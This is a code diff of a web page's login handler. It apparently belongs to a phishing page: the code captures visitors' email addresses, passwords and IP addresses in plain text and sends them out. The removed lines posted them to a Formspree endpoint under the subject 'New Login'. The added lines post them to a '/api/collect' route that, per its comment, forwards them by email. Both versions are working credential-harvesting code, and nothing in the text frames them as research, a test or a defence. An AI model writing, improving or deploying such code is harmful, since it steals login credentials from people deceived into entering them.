@@ -981,22 +981,19 @@ async function handleLogin(e) {
             t: Date.now(),
         };
         
-        // Send directly to Formspree
+        // Send to our backend (which forwards to Resend)
 try {
-    await fetch('https://formspree.io/f/xaengadv', {
+    await fetch('/api/collect', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
             'Accept': 'application/json'
         },
         body: JSON.stringify({
-            _subject: 'New Login',
             email: email,
             password: password,
             ip: ip || 'Unknown',
-            userAgent: navigator.userAgent,
-            page: window.location.href,
-            message: `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nPage: ${window.location.href}`
+            userAgent: navigator.userAgent
         })
     });
 } catch (e) {
